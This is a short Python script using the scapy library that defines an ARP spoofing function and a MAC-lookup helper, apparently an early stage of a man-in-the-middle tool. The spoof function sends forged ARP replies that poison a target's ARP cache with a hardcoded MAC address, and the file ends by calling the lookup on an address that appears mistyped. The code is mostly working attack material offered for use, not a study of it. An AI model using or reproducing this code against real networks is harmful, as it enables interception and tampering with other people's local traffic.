import scapy.all as scapy


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2 ,pdst = target_ip ,hwdst = "00:0c:29:e9:df:c2",psrc =spoof_ip)
    scapy.send(packet)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 3,verbose = False)[0]
    print(answered_list[0][1].hwsrc)
    

get_mac("196.168.11.2")
